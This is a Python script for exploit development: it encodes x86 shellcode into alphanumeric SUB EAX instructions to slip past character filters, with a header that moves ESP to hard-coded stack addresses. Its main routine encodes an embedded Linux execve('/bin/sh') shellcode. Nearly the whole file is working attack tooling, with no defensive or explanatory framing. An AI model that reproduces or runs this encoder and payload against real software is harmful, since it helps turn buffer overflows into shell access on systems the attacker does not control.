import binascii

MAX_DEPTH = 1
GOAL_DEPTH = 0
FIRST_RUN = True
usable_chars = [ '%', '_', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9',
                 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l',
                 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x',
                 'z', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K',
                 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W',
                 'X', 'Y', 'Z', '-' ]



def find_char(end_val, start_val, char_list, depth):
    
    global usable_chars
    global GOAL_DEPTH
    global MAX_DEPTH

    success = False
    depth += 1
    
    if depth > MAX_DEPTH:
        return False
    
    for char in usable_chars:
        test_val = (ord(end_val) + ord(char)) & 0x000000ff
        #print("Goal: %d value: %d End: %d Depth: %d" % (ord(start_val),test_val, ord(end_val), depth))
        if chr(test_val) == start_val:
            #print("Hit!: %s" % char)
            if depth >= GOAL_DEPTH:
                char_list.insert(0,char)
                success = True        
                
    if success == True and depth > GOAL_DEPTH:
        GOAL_DEPTH = depth
        #print("Setting Goal depth: %d" % GOAL_DEPTH)
        
    if not success:
        #print("Recursion! %d" % depth)
        for char in usable_chars:
            #print("%s: " % char, end='')
            test_val = (ord(end_val) + ord(char)) & 0x000000ff
            result = find_char(chr(test_val), start_val, char_list, depth)
            if result != False:
                char_list.insert(0,char)
                depth = result
                #print("%d" % depth)
                break
            
        if result == False:
            #print("Returning False: %d" % depth)
            return False
        
    return depth

def check_depth(dword):
    global GOAL_DEPTH
    global MAX_DEPTH
    
    balanced = True

##    if GOAL_DEPTH == 0:
##        #print("Goal depth is 0")
##        return False
    #print("Passed goal depth check")
    for byte in dword:
        #print(byte['depth'])
        if byte['depth'] == False:
            MAX_DEPTH += 1
            #print("Going Deeper")
            return False
        elif byte['depth'] != GOAL_DEPTH:
            balanced = False

    return balanced

def get_carry(byte):
    sum = ord(byte['start_val'])
    for char in byte['char_list']:
        #print("Sum: %d" % sum)
        sum += ord(char)
    #print("Carry: %d" % sum) 
    #print("Carry: %d" % ((sum & 0x0000ff00) >> 8))  
    return (sum & 0x0000ff00) >> 8

def hex_print(byte):
    global GOAL_DEPTH
    for i in range(0,GOAL_DEPTH):
        value = ''
        for byte_count in range(0,len(byte)):
            value = hex(ord(byte[byte_count]['char_list'][i]))[2:] + value
        print('0x' + value)

def hex_print_start(dword):
    hex_dword = ""

    for byte in dword:
        hex_dword = hex(ord(byte['start_val']))[2:] + hex_dword
    print("0x" + hex_dword)

def hex_print_end(dword):
    hex_dword = ""
  
    for byte in dword:
        hex_dword = hex(ord(byte['end_val']))[2:] + hex_dword
    print("0x" + hex_dword)
    
def build_byte_string(shellcode, format = "hex", chain = False):

    byte_string = []
    previous_dword = ['\x00', '\x00', '\x00', '\x00']
    y = 0
    
    if format == "hex":
        pad_count = len(shellcode) // 2
        if(pad_count % 2 != 0):
            print("Invalid hex string, missing a byte")
            exit()
        pad_count = pad_count % 4
        shellcode += "90" * pad_count

        for i in range(0,len(shellcode),2):
            current_byte = chr(int(shellcode[i:i+2], 16))
           
            byte_string.append({'start_val':current_byte, 'end_val':previous_dword[y], 'depth':0, 'char_list': []})
            
            if chain == True:
                print("Chaining!")
                previous_dword[y] = current_byte
                y += 1
                if y % 4 == 0:
                    y = 0
                    
    if format == "python":
        pad_count = len(shellcode) % 4
        shellcode += "\x90" * pad_count

        for current_byte in shellcode:
            byte_string.append({'start_val':current_byte, 'end_val':previous_dword[y], 'depth':0, 'char_list': []})
            if chain == True:
                previous_dword[y] = current_byte
                y += 1
                if y % 4 == 0:
                    y = 0
    #print(byte_string)                
    return byte_string


def generate_shellcode(byte_string):
    dword = []
    build_shellcode_header('0xbffff72c','0xbffff600')
    for i in range((len(byte_string)-2),0,-4):
        dword.append(byte_string[i-3])
        dword.append(byte_string[i-2])
        dword.append(byte_string[i-1])
        dword.append(byte_string[i])
        
        #hex_print_end(dword)
        encode_dword(dword)
        #hex_print_start(dword)
        #print("")
        #hex_print(dword)
        #print("")
        #input("")
        print_shellcode(dword, output = "python", chain = True)
        dword.clear()

def print_shellcode(dword, output = "python", chain = False, no_headers = False):
    
    global GOAL_DEPTH

    clear_eax = "\\x25\\x25\\x25\\x25\\x25\\x25\\x42\\x42\\x42\\x42"
    if (chain == False and no_headers == False):
        #print("Clear")
        print(clear_eax, end="")
    for i in range(0,GOAL_DEPTH):
        if output == "python":
            print("\\x2d", end="")
        elif output == "hex":
            print("2d", end="")
        value = ''
        for byte in dword:
            value = hex(ord(byte['char_list'][i]))[2:]
            if(output == "python"):
                value = "\\x" + value
            print(value, end="")
    if no_headers == False:
        print("\\x50", end="")

def find_and(start_val, end_val):
    and_pair = []
    for char in usable_chars:
        for second_char in usable_chars:
            if (ord(char) & ord(second_char) == ord(end_val)):
                and_pair.append([char, second_char])

    print(hex(ord(and_pair[0][0])))
    print(hex(ord(and_pair[0][1])))
    print("Test")

def build_shellcode_header(start_mem, goal_mem):
    """Creates and prints the first section of shellcode.

    This function builds and prints the first section of shellcode
    this is very rigid at the moment and is only used create shellcode
    that takes the following format:

    push esp
    pop  eax
    sub  eax, 0xXXXXXXXX
    sub  eax, 0xXXXXXXXX
    push eax
    pop  esp
    and  eax, 0xZZZZZZZZ
    and  eax. 0xZZZZZZZZ

    This shellcode is intented to save esp, modify it by subtracting
    (or adding) the difference between start_mem and goal_mem, restoring
    this value back into esp and clearing eax ready for the next section of
    shellcode. All of this is done using bytes that fall into our usable_chars
    list.
    
    Args:
        start_mem: The initial value of ESP in the format 0x12345678
        goal_mem: The goal value of ESP in the format 0x12345678
        
    Returns:
        Nothing, this function only prints the headers.

    TODO:
        Modify the function to return the value generates as a varaible
        to allow building of shellcode rather than just printing.

        Move opcode variables values to another module maybe for ease of re-use

        Allow output of straight hex output, not just python/c compatible strings
    """

    # Define our opcodes, currently only in python/c format
    push_esp = "\\x54"  
    pop_eax  = "\\x58"
    push_eax = "\\x50"
    pop_esp  = "\\x5c"
    clear_eax = "\\x25\\x25\\x25\\x25\\x25\\x25\\x42\\x42\\x42\\x42"
 
    # This dword will store our goal_mem values and be used to compute the values
    # used in the sub eax instructions 
    dword = []

    # This check is to determine if the input was given in the correct format
    if len(start_mem) != 10 or len(goal_mem) != 10:
        print("Memory locations must be 8 digit hex in format 0x12345678")
        exit()

    # To convert the provided start_mem and goal_mem into a format compatible
    # with our encode_dword() function we need to loop 4 times through our two strings
    # starting at position 2 (skipping 0x) and moving 2 characters at a time
    for i in range(2,10,2):
        # Take the two characters of our string, convert them into a hex integer, convert this
        # hex value to an ascii character, this if the format required for the encode_dword()
        # function
        start_val = chr(int(start_mem[i:i+2], 16))
        end_val   = chr(int(goal_mem[i:i+2], 16))
        #print(start_val + " " + end_val)
        # Build our dword, inserting the newly created ascii value into the first position in
        # the dword, we need to reverse the end_val and the_start val due to how the value is calculated
        dword.insert(0,{'start_val': end_val, 'end_val': start_val, 'depth': 0, 'char_list': []})

    # Calculate the steps needed to be taken to go from start_mem to goal_mem by subtracting characters from each other
    # that fall into the usable_chars list
    encode_dword(dword)

    # Print the first two opcodes with no trailing EOL 
    print(push_esp + pop_eax, end="")
    # Print the opcodes used to go from start_mem to goal_mem without any extra opcodes
    print_shellcode(dword, no_headers = True)
    # Print the final two opcodes 
    print(push_eax + pop_esp, end="")
    # Print the opcodes to clear the eax register
    print(clear_eax, end="")
          
def encode_dword(dword):
    """Calculates the steps to take to go from start_val to end_val specified for each byte in the dword
        
    This function takes a dword structure containing a list of dictionaries.
     
    The dword list is walked through starting at the least significant bit, the steps to reach the goal_value
    are calculated and saved for each byte in it's char_list

    Args:
        dword a structure that is a list of 4 dictionries with the structure:
            'start_val':    : The value we are starting at
            'end_val':      : The value we are trying to reach
            'depth':        : The current depth (how many characters it takes to reach our goal)
            'char_list': [] : The list of characters

    Returns:
        Nothing, this function modifies the char_list of each byte provided to it.

    TODO:

    """
    # GOAL_DEPTH is used to record the byte with the longest depth.
    global GOAL_DEPTH

    # Max Depth is used to bound our recursive function, in order to find the most optimal depth
    # we recurse to MAX_DEPTH, if one of our bytes is not able to reach it's desired value with that depth
    # we increment MAX_DEPTH and run through each byte again.
    global MAX_DEPTH

    # Set our first run to be bounded at 1 character deep, maybe we'll get lucky.
    MAX_DEPTH = 1

    # Reset GOAL_DEPTH for our first run.
    GOAL_DEPTH = 0
    
    # The main loop driving the program, one thing we need to consider is that even though we are operating byte by byte
    # through the dword, we need to cater for the byte with the longest requirement. If one byte can reach our desired value
    # in two steps, but another requires 3 we need to go back and re-work the byte with the lower requirement to be equal to
    # the byte with the higher steps. We need to reconsider how the newly generated bytes will be affected by carries as well
    
    # The loop works via checking the depth, we record the byte with the deepest depth in the global var GOAL_DEPTH, we run through
    # this loop continually until all 4 bytes have the equivilent depth

    # The check depth function checks to see if all bytes have equal depths, if this is satisfied our loop stops.
    while not check_depth(dword):
        
        # We will work one byte at a time, if the addition of two values results in a carry (i.e the values subtracted from
        # each other require borrowing from the neighboring byte) we need to be aware of that and factor it into our calculation
        # each time we loop reset this back to 0.
        carry = 0

        # Temp val is used to store our bytes modified by carries
        temp_val = "\x00"

        for byte in dword:
            
##            print("Trying %s" % hex(ord(byte['start_val'])))
##            print("Trying %s" % hex(ord(byte['end_val'])))
##            byte['temp_val'] = byte['start_val']
            
            # Save our original start value in temp so we can restore it later, we might need to pass the modified
            # Start val that is affected by carries.
            temp_val = byte['start_val']
            # Clear our word list, if this is not our first run it might be populated
            byte['char_list'].clear()
            # Reset the depth back to 0, if it not our first run it might be another value
            byte['depth'] = 0
            
##            print("Before carry: %d" % ord(byte['start_val']))
            
            # If we have a carry from a previous calculation, add this too our start_val
            byte['start_val']=chr(ord(byte['start_val']) + carry)
            
##            print("After carry: %d" % ord(byte['start_val']))
            
            # This is where the magic happens, find the characters that are added together to reach our value
            # and save the these in the char_list, save the calculated depth.
            # This function is run each time through the loop with a reset depth because we assume 
            byte['depth'] = find_char(byte['start_val'], byte['end_val'], byte['char_list'], 0)
            # Calculate the carry value from our list and save it, this will be used to modify the next byte
            # we hit in the loop
            carry = get_carry(byte)
##            print("Done", byte['char_list'], byte['depth'], byte['start_val'])
            # Restore our start_val after we modified it with the carry, otherwise future calculations will be
            # based on failed loops.
            byte['start_val'] = temp_val
        
if __name__ == "__main__":
    """"
    The intention is to have a start value and an end value e.g: the start value is 0x00000000
    and an end value e.g. 0x12345678, using only the values provided in the global variable usable_chars
    find the values that can be subtracted from the start value to reach the end value.
    
        0x00000000
      - 0x735f5f25   (%__s)
        ----------
        0x8ca0a0db
       - 0x7a6c4a63   (cJlz)
        ----------
        0x12345678
     
    We will operate on 4 bytes at a time, a dword. These bytes will be stored in a list
    

    Establish our initial structure, loop 4 times with a dummy value, set the depth to 0 and create
    an empty list to store our calculated steps to reach the end value
    for i in range(0,4):
        dword.append({'start_val':'\x41','temp_val':'\x41', 'end_val':'\x00', 'depth':0, 'min_depth':(MAX_DEPTH + 1), 'char_list': []})

     Intel is big endian so we need to store the byte backwards
    dword[3]['value'] = '\x12'
    dword[2]['value'] = '\x34'
    dword[1]['value'] = '\x56'
    dword[0]['value'] = '\x78'

    We will work one byte at a time, if the addition of two values results in a carry (i.e the values subtracted from
    each other require borrowing from the neighboring byte) we need to be aware of that and factor it into our calculation


    """

    shellcode = '"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x50\x8d\x5c\x24\x04\x53\x8d\x0c\x24\x8b\x54\x24\x04\xb0\x0b\xcd\x80"'

    byte_string = []
    find_and('\x00','\x00')
    byte_string = build_byte_string(shellcode, format = "python", chain = False)
    generate_shellcode(byte_string)
    #print(byte_string)
    

    
